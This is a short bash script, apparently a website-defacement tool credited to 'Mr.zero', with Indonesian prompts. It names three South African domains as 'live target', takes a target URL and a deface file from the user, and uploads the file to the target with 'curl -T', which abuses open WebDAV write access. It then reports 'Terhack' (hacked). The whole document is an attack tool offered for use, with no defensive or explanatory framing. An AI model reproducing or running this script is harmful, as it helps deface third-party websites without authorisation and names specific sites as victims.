clear
#!/bin/bash
#webdav01
echo
figlet webdav01 | lolcat
echo
echo "-----------------------" | lolcat
echo "coded by = Mr.zero" | lolcat
echo "Youtube = Mr zero" | lolcat
echo "+++++++++++++++++++++++" | lolcat
echo "live target" | lolcat
echo "http://foodconsult.co.za" | lolcat
echo "http://uzingela.co.za" | lolcat
echo "http://thefoundation.co.za" | lolcat
echo "Masukkan target : " | lolcat
read target
echo "Masukkan file deface kamu :" | lolcat
read file
sleep 1
echo "Plase wait....."
sleep 3
curl -T /sdcard/$file $target
echo "Terhack" | lolcat
echo "Terimakasih telah menggunakan tools saya " | lolcat

